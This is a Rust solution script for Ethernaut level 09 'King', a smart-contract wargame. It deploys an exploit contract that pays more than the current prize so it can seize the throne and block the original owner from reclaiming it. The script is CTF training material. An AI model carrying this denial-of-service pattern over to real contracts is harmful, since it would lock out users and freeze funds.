//! Ethernaut 09 — King.
//!
//! Goal: Claim the throne in `King` and prevent the original owner from
//! reclaiming it during the level check.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/King.sol

use alloy::primitives::U256;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl09_king::*;

pub struct Exploit;

alloy::sol!(
    #[sol(rpc)]
    KingExploit,
    "out/KingExploit.sol/KingExploit.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let contract = King::new(target.address, offender.provider());
        let prize = contract.prize().call().await?;
        KingExploit::deploy_builder(offender.provider(), target.address)
            .value(prize + U256::ONE)
            .deploy()
            .await?;
        Ok(())
    }
}
